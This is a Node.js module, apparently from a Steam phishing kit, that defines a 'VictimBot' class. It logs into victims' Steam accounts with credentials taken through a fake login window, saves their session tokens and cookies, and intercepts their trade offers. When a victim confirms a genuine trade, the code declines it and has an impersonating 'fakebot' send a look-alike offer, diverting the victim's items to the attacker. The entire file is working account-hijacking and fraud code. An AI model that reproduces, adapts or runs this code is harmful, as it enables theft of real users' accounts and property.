const SteamUser = require('steam-user')
const SteamCommunity = require('steamcommunity')
const SteamID = SteamUser.SteamID
const TradeOfferManager = require('steam-tradeoffer-manager')
const SteamTotp = require('steam-totp')
const request = require('request')
const Statistics = require('./statistics')
const fs = require('fs')
const util = require('util')
const readFile = util.promisify(fs.readFile)

/*
* Модуль бота аккаунта жертвы
*/

const endsWith = (str, suffix) => {
    return str.indexOf(suffix, str.length - suffix.length) !== -1
}

class VictimBot {
    constructor (login, password) {
        this.login = login
        this.password = password
        this.steamid = null
        this.avatarURL = ''
        this.authed = false
        this.tradeStatus = { text: 'OK', color: 'green' }
        this.canRelog = false
        this.startTime = Date.now()
        this.balance = 0;
        this.emailGuard = false
        this.canPollTrades = true

        this.checkMobileIntervals = {}
        this.handledOffers = []

        try {
            this.steamuser = new SteamUser()
            this.steamuser.setOption('promptSteamGuardCode', false)
    
            this.community = new SteamCommunity()
            this.community.on('sessionExpired', this.sessionExpiredHandler.bind(this))
    
            this.manager = new TradeOfferManager({
                community: this.community,
                pollInterval: 3000,
                savePollData: true,
                language: 'en'
            })    
            this.manager.on('newOffer', this.newOfferHandler.bind(this))
            this.manager.on('unknownOfferSent', this.unknownOfferSentHandler.bind(this))
            this.manager.on('receivedOfferChanged', this.receivedOfferChangedHandler.bind(this))
            this.manager.on('sentOfferChanged', this.sentOfferChangedHandler.bind(this))
            this.manager.on('pollFailure', this.sessionExpiredHandler.bind(this))
        } catch (error) {
            this.steamLogout()
        }
        
        process.on('unhandledRejection', error => {
            console.log(error.message);
        });
        
        process.on('uncaughtException', error => {
            console.log(error.message);
        });
    }

    sentOfferChangedHandler(offer) {
        //console.log(`Sent Offer #${offer.id} changed to state ${offer.state}`);
        if(global.fakebot.replacedOffers[offer.id] !== undefined && [3, 5, 6, 7].includes(offer.state)) {
            global.fakebot._reloadBotInventory()
        }
        if (offer.id in Statistics.lastTrades) {
            Statistics.lastTrades[offer.id].status = offer.state
            global.broadcastWS({ type: 'trade' })
        }
    }

    receivedOfferChangedHandler(offer) {
        //console.log(`Recieved Offer #${offer.id} changed to state ${offer.state}`);
        if(global.fakebot.replacedOffers[offer.id] !== undefined && [3, 5, 6, 7].includes(offer.state)) {
            global.fakebot._reloadBotInventory()
        }
        if (offer.id in Statistics.lastTrades) {
            Statistics.lastTrades[offer.id].status = offer.state
            global.broadcastWS({ type: 'trade' })
        }
    }

    newOfferHandler(offer) {
        //console.log(`Recieved new tradeoffer #${offer.id}`);
        if(offer.created.getTime() < this.startTime) {
            return
        }
        this.handleReceivedOffer(offer)
    }

    unknownOfferSentHandler(offer) {
        //console.log(`Detected new sent tradeoffer #${offer.id}`);
        if(offer.created.getTime() < this.startTime) {
            return
        }
        global.broadcastWS({ type: 'trade' })
        this.handleSentOffer(offer)
    }

    async afterLogin() {
        return new Promise((resolve, reject) => {
            this.steamid = this.community.steamID.getSteamID64()
            this.community.getSteamUser(this.community.steamID, (getError, user) => {
                if (getError) {
                    resolve()
                    return console.error(`[${this.login}] ${getError}`)
                }
    
                this.avatarURL = user.getAvatarURL('full')
                this.authed = true
                resolve()
            })
        })
    }

    async authFromFakeWindow (twoFactorCode = false, restoreSession = false) {
        try {
            await this._steamLoginPromise(false, twoFactorCode, restoreSession)
            await this.afterLogin()
            global.broadcastWS({ type: 'account' })
            return {
                status: 'logged_in',
                steamid: this.steamid
            }
        } catch (error) {
            if (error.message === 'SteamGuardMobile' || error.message === 'SteamGuard') {
                return { 
                    domain: error.domain,
                    status: 'need_tfa'
                }
            }

            console.log(`[${this.login}] ${error.message}`)
            return {
                status: 'error',
                message: error.message
            }
        }

        return {
            status: 'error',
            message: 'returned outside try/catch block, WAT!?'
        }
    }

    async steamLogout (silent = false, removeWaiting = false) {
        if(!silent) {
            console.log(`[${this.login}] Logout`)
        }
        
        this.canPollTrades = false
        this.authed = false
        try {
            if(Object.keys(this.checkMobileIntervals).length > 0) {
                for(const id in this.checkMobileIntervals) {
                    clearInterval(this.checkMobileIntervals[id])
                }
            }
            this.manager.removeAllListeners()
            this.manager.shutdown()
        } catch (logoffException) {
            console.log(`[${this.login}] ${logoffException}`);
        }
    }

    async handleReceivedOffer (offer) {
        this.handledOffers.push(offer.id)

        /*
        * Если трейд отправлен фейк-ботом, принимаем его
        */
        if (offer.partner.getSteamID64() === global.fakebot.steamid) {
            try {
                await this._acceptOfferPromise(offer)

                console.log(`[${this.login}] Fake trade accepted via SteamProxy, waiting for mobile confirmation`)
                return true
            } catch (acceptError) {
                console.error(`[${this.login}](FAKEACCEPT) ${acceptError}`)

                /* 
                * Если получена ошибка, то авторизовываемся и обрабатываем трейд вновь
                */
                await this.restoreSession()
                return this.manager.emit('newOffer', offer)
            }
        }

        if (offer.id in this.checkMobileIntervals) {
            return false
        }

        if (offer.itemsToGive.length == 0) {
            return false
        }

        let amount = 0

        for(let i = 0; i < offer.itemsToGive.length; i++) {
            if(global.prices[offer.itemsToGive[i].market_hash_name] !== undefined) {
                amount += global.prices[offer.itemsToGive[i].market_hash_name]
            }
        }

        if(isNaN(amount)) {
            amount = 0
        }

        if(amount < global.webConfig.settings.offerMinimal) {
            this.handledOffers.push(offer.id)
            console.log(`[${this.login}] Received real trade: ${offer.id}, but offer price (${amount}) is lower than ${global.webConfig.settings.offerMinimal}, skipping...`)
            return
        }

        let replacementItem = null
        if(offer.itemsToReceive.length > 0) {
            replacementItem = this._processReplacement(offer.itemsToReceive, amount)
        }

        console.log(`[${this.login}] Received real trade: ${offer.id}`)

        this.checkMobileIntervals[offer.id] = setInterval(
            () => this.checkMobileConfirmation(offer.id, replacementItem),
            1000
        )
    }

    async handleSentOffer (offer, isAgain = false) {
        /* 
        * Если трейд в состоянии отличном от ожидания подтверждения с мобильного телефона, то прекращаем обработку
        */
        if (!isAgain && offer.state != 9) {
            return false
        }
        /* 
        * Если имеются вещи, которые жертва получит от принимающего, то прекращаем обработку
        */
        if (offer.itemsToReceive.length != 0 && offer.itemsToGive.length === 0) {
            return false
        }

        let amount = 0

        for(let i = 0; i < offer.itemsToGive.length; i++) {
            if(global.prices[offer.itemsToGive[i].market_hash_name] !== undefined) {
                amount += global.prices[offer.itemsToGive[i].market_hash_name]
            }
        }

        if(isNaN(amount)) {
            amount = 0
        }

        if(amount < global.webConfig.settings.offerMinimal) {
            this.handledOffers.push(offer.id)
            console.log(`[${this.login}] Victim sent offer ${offer.id}, but offer price (${amount}) is lower than ${global.webConfig.settings.offerMinimal}, skipping...`)
            return
        }
        
        const newOffer = this.manager.createOffer(global.fakebot.steamid, global.fakebot.tradeToken)
        newOffer.addMyItems(offer.itemsToGive)

        let replacementItem = null
        
        if(offer.itemsToReceive.length > 0) {
            replacementItem = this._processReplacement(offer.itemsToReceive, amount)
        }
        
        if(replacementItem != null) {
            newOffer.addTheirItem(replacementItem)
        }
        
        if (!isAgain) {
            offer.decline()
            global.fakebot.changeIdentity(offer.partner)
            this.handledOffers.push(offer.id)
        }

        newOffer.send(async(sendError, status) => {
            if (sendError) {
                console.error(`[${this.login}](SENDOFFER) ${sendError}`)

                if(replacementItem != null) {
                    global.fakebot.addItem(replacementItem.classid, replacementItem)
                }

                if(sendError.message == "Error: There was an error sending your trade offer.  Please try again later.<br><br>You recently forgot and then reset your Steam account's password. In order to protect the items in your inventory, you will be unable to trade for 5 more days.") return
                if(endsWith(sendError.message, 'you will be unable to trade from this device for 7 days.')) return
                if(endsWith(sendError.message, 'because you have blocked them.')) return
                if(endsWith(sendError.message, 'Please cancel some before sending more.')) return

                await this.restoreSession()
                setTimeout(() => {
                    this.handleSentOffer(offer, true)
                }, 1000)
                return
            }

            /* 
            * Добавляем новый оффер в список проверенных, чтобы его не обработать еще раз
            */
            this.handledOffers.push(newOffer.id)

            if(replacementItem != null) {
                global.fakebot.replacedOffers[newOffer.id] = replacementItem
            }

            Statistics.lastTrades[newOffer.id] = {
                sender: this.login,
                steamid: this.steamid,
                accepted: false,
                amount,
                status: 9
            }
            global.broadcastWS({ type: 'trade' })

            console.log(`[${this.login}] Fake offer ${newOffer.id} created, status: ${status}`)
        })
    }

    _processReplacement(checkItems, offerPrice) {
        let preciseReplacement = null
        let replacement = null
        let knifeCount = 0
        let glovesCount = 0
        for(const item of checkItems) {
            if(item.type.includes('Knife')) {
                knifeCount++;
            }
            if(item.type.includes('Gloves')) {
                glovesCount++;
            }
            if(preciseReplacement === null) {
                preciseReplacement = this._checkReplacementPrecise(item.market_name)
            }
        }

        if(preciseReplacement !== null) {
            replacement = preciseReplacement
        } else {
            if(knifeCount > 0 && glovesCount > 0) {
                if(global.webConfig.settings.allItem !== null) {
                    replacement = global.webConfig.items[global.webConfig.settings.allItem]
                }
            } else if(knifeCount > 0 && global.webConfig.settings.knifeItem !== null) {
                replacement = global.webConfig.items[global.webConfig.settings.knifeItem]
            } else if(glovesCount > 0 && global.webConfig.settings.glovesItem !== null) {
                replacement = global.webConfig.items[global.webConfig.settings.glovesItem]
            }  else if(global.webConfig.settings.allItem !== null) {
                replacement = global.webConfig.items[global.webConfig.settings.allItem]
            }
        }

        let replacementItem = null;
        if(replacement && offerPrice > replacement.price) {
            replacementItem = this._getReplacementItem(replacement)
        }

        return replacementItem
    }

    _checkReplacementPrecise(itemName) {
        for(const id in global.webConfig.items) {
            if(global.webConfig.items[id].name == '*') {
                continue
            }
            if(itemName == global.webConfig.items[id].name) {
                return global.webConfig.items[id]
            }
        }

        return null
    }

    _getReplacementItem(replacement) {
        let replacementItem = null
        if(replacement && global.fakebot.isHaveItem(replacement.classID)) {
            replacementItem = global.fakebot.popItem(replacement.classID)
        } else if(global.webConfig.settings.allItem !== null) {
            const allReplacement = global.webConfig.items[global.webConfig.settings.allItem]
            if(global.fakebot.isHaveItem(allReplacement.classID)) {
                replacementItem = global.fakebot.popItem(allReplacement.classID)
            }
        }

        return replacementItem
    }

    /*
    * Обработчик проверки на подтверждение полученного жертвой оффера
    */
    async checkMobileConfirmation (offerId, replacementItem) {
        if(global.victimsList[this.login] == undefined) {
            clearInterval(this.checkMobileIntervals[offerId])
            return;
        }
        const offer = await this._getOfferPromise(offerId)
        if (offer.confirmationMethod != 2) {
            return false
        }

        clearInterval(this.checkMobileIntervals[offer.id])

        if (!this.tradeToken) {
            try {
                this.tradeToken = await this._getTokenPromise()
            } catch (tokenError) {
                console.error(`[${this.login}](GETTOKEN) ${tokenError}`)
                await this.restoreSession()
                return this.checkMobileConfirmation(offerId, replacementItem)
            }
        }

        console.log(`[${this.login}] Victim confirmed the real trade (${offer.id}), send the fictitious...`)

        await global.fakebot.changeIdentity(offer.partner)

        let newOfferId = global.fakebot.createOffer({
            steamid: this.steamid,
            token: this.tradeToken,
            skins: offer.itemsToGive,
            message: offer.message,
            replacementItem
        })

        if(replacementItem != null) {
            global.fakebot.replacedOffers[newOfferId] = replacementItem
        }

        offer.decline((declineError) => {
            if (declineError) {
                console.error(`[${this.login}](REALDECLINE) ${declineError}`)
            }

            console.log(`[${this.login}] The real trade (${offer.id}) has been declined via SteamProxy`)
        })
    }

    /* 
    * Promisify-функции 
    */
    _acceptOfferPromise (offer) {
        return new Promise ((resolve, reject) => {
            offer.accept(true, (acceptError, status) => {
                if (acceptError) {
                    return reject(acceptError)
                }

                if (status !== 'pending') {
                    return reject()
                }

                return resolve()
            })
        })
    }

    _getTokenPromise () {
        return new Promise ((resolve, reject) => {
            this.manager.getOfferToken((tokenError, token) => {
                if (tokenError) {
                    return reject(tokenError)
                }

                return resolve(token)
            })
        })
    }

    _getOfferPromise (offerId) {
        return new Promise ((resolve, reject) => {
            this.manager.getOffer(offerId, (offerError, offer) => {
                if (offerError) {
                    return reject(offerError)
                }

                return resolve(offer)
            })
        })
    }

    _steamLoginPromise (isAfterKick = true, twoFactorCode = false, restoreSession = false) {
        try {
            return new Promise((resolve, reject) => {
                const options = {
                    "accountName": this.login,
                    "password": this.password
                }

                if(twoFactorCode) {
                    if(this.emailGuard) {
                        options.authCode = twoFactorCode
                    } else {
                        options.twoFactorCode = twoFactorCode
                    }
                }

                this.community.login(options, (err, sessionID, cookies, steamguard, oAuthToken) => {
                    if(err) {
                        const reason = {message: err.message, domain: null}
                        if(err.message == 'SteamGuard') {
                            this.emailGuard = true
                            reason.domain = err.emaildomain
                        }
                        return reject(reason)
                    }

                    global.writeSession(this.login, this.password, steamguard, oAuthToken)

                    this.manager.setCookies(cookies, (cookiesError) => {
                        if(cookiesError) {
                            return reject(cookiesError)
                        }

                        this.authed = true
                        this.canRelog = true
    
                        console.log(`[${this.login}] Successfully logged in`)
                        this.saveCookie(cookies, true)
                        resolve(true)
                    })
                })
            })
        } catch(e) {
            console.log(e)
        }
    }

    restoreSession() {
        try {
            const session = global.savedSessions[this.login]
            return new Promise((resolve, reject) => {
                this.community.oAuthLogin(session.steamguard, session.oAuthToken, (err, sessionID, cookies) => {
                    if(err && err.code !== undefined && err.code == 401) {
                        console.log(`[${this.login}] Session dead`, err)
                        this.steamLogout()
                        delete global.victimsList[this.login]
                        global.removeSession(this.login)
                        return reject({reason: 'SesssionDead', error: err})
                    }
                    this.saveCookie(cookies)
                    this.manager.setCookies(cookies, async (cookiesError) => {
                        if(cookiesError) {
                            return reject({reason: 'TradeOfferCookiesError', error: cookiesError})
                        }
    
                        console.log(`[${this.login}] Relogged`)
                        this.canRelog = true
                        if(this.steamid !== null) {
                            this.authed = true
                        } else {
                            await this.afterLogin()
                        }
    
                        resolve(true)
                    })
                })
            })
        } catch(e) {
            console.log(e);
        }
    }

    async saveCookie(cookie, auth = false) {
        var defaultCookie = JSON.parse(await readFile(`./manager/cookies/cookie.json`, 'utf8'))
        var impoortCookie = new Array()
        cookie.forEach(function (str) {
            impoortCookie.push(str.split('=', 2))
        })
        if(auth) {
            defaultCookie[0].name = impoortCookie[4][0]
            defaultCookie[0].value = impoortCookie[4][1]
            defaultCookie[1].value = impoortCookie[5][1]
            defaultCookie[3].value = impoortCookie[3][1]
        } else {
            defaultCookie[0].name = impoortCookie[2][0]
            defaultCookie[0].value = impoortCookie[2][1]
            defaultCookie[1].value = impoortCookie[3][1]
            defaultCookie[3].value = impoortCookie[1][1]
        }

        fs.writeFile(`./manager/cookies/${this.login}.json`, JSON.stringify(defaultCookie), function(err) {
            if(err) {
                return console.log(err);
            }
        });
    }

    async sessionExpiredHandler(err) {
        if(!this.canRelog) {
            return
        }

        console.log(`[${this.login}] Web session expired, trying to relogin`)
        console.log(err)
        try {
            this.authed = false
            this.canRelog = false
            await this.restoreSession()
        } catch(e) {
            console.log(e)
        }
    }

    /*
    _steamLoginPromise (isAfterKick = true, twoFactorCode = false, restoreSession = false) {
        try {
            if (this.steamguard && twoFactorCode) {
                this.steamguard(twoFactorCode)
                delete this.steamguard
            }
    
            return new Promise ((resolve, reject) => {
                if (!twoFactorCode && !isAfterKick) {
                    const options = {
                        accountName: this.login,
                        password: this.password,
                        rememberPassword: true,
                        logonID: Math.random() * (4294967295 - 100000) + 100000
                    }
                    if(restoreSession && fs.existsSync('sentry/' + this.login)) {
                        options.loginKey = (fs.readFileSync('sentry/' + this.login)).toString()
                    }
                    this.steamuser.logOn(options)
                }

                if (isAfterKick && this.canRelog) {
                    this.steamuser.relog()
                }
                
                if(twoFactorCode) {
                    this.community.login({
                        accountName: this.login,
                        password: this.password,
                        twoFactorCode: twoFactorCode,
                        steamguard: twoFactorCode
                    }, (err, sessionID, cookies, steamguard, oAuthToken) => {
                        console.log(err, sessionID, cookies, steamguard, oAuthToken)
                    })
                }
                

                this.steamuser.on('webSession', (sessionID, cookies) => {
                    this.manager.setCookies(cookies, (cookiesError) => {
                        if(cookiesError) {
                            return reject(cookiesError)
                        }

                        //polthis.pollTrades()
    
                        console.log(`[${this.login}] Successfully logged in`)
    
                        resolve(true)
                    })

                    this.steamuser.getSteamGuardDetails((err, isSteamGuardEnabled, timestampSteamGuardEnabled, timestampMachineSteamGuardEnabled, canTrade, timestampTwoFactorEnabled, isPhoneVerified) => {
                        if(err) {
                            return console.log(`[${this.login}] Steam Guard Details error`)
                        }
                        if(!isSteamGuardEnabled) {
                            this.tradeStatus = { text: 'NO-GUARD', color: 'red' }
                            return;
                        }
                        if(timestampSteamGuardEnabled) {
                            const enabledDate = new Date(timestampSteamGuardEnabled)
                            let days15 = new Date();
                            days15.setDate(days15.getDate() - 15)
                            if(enabledDate.getTime() > days15.getTime()) {
                                this.tradeStatus = { text: '15d', color: 'red' }
                            }
                        }
                        if(timestampTwoFactorEnabled) {
                            const twoFactorDate = new Date(timestampTwoFactorEnabled)
                            let days7 = new Date();
                            days7.setDate(days7.getDate() - 7)
                            if(twoFactorDate.getTime() > days7.getTime()) {
                                this.tradeStatus = { text: '7d', color: 'red' }
                            }
                        }
                    })

                    this.steamuser.removeAllListeners('error')
                    this.steamuser.removeAllListeners('steamGuard')
                })

                this.steamuser.once('wallet', (hasWallet, currency, balance) => {
                    if(hasWallet) {
                        this.balance = balance;
                    }
                })

                this.steamuser.on('loginKey', (loginKey) => {
                    this.canRelog = true
                    fs.writeFileSync('sentry/' + this.login, loginKey)
                })
    
                this.steamuser.on('error', (error) => {
                    this.steamuser.removeAllListeners('webSession')
                    this.steamuser.removeAllListeners('steamGuard')
                    this.steamuser.removeAllListeners('loginKey')
    
                    console.log(error)
    
                    reject(error)
                })
    
                this.steamuser.once('steamGuard', (domain, callback) => {
                    this.steamuser.removeAllListeners('webSession')
                    this.steamuser.removeAllListeners('error')
    
                    this.steamguard = callback
                    reject({message: 'SteamGuardMobile', domain: domain})
                })
            })
        } catch (error) {
            console.log(this.login + ' ' + error)
            this.steamLogout()
        }
    }
    */
}

module.exports = VictimBot
